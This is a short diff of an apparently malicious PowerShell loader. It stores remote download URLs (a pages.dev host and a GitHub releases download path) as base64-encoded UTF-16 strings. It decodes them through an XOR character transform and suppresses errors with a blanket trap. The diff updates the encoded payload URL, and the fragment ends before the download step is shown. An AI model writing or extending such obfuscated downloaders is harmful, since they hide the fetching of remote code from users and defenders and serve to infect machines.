@@ -2,7 +2,7 @@ $ErrorActionPreference="Stop"
 trap{continue}
 $urls=@(
     'MwAtADQAcAB4AC4AcABhAGcAZQBzAC4AZABlAHYALwA=',
-    'aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZQBzAC8AdgAxAC4AMAA=',
+    'aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA==',
 )
 function d($s){[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s))}
 $repo='https://'+(d($urls[0]) -replace '(.)',{param($c)[char]([byte][char]$c -bxor 1)}) -replace '[^\w\.\/\-]',''
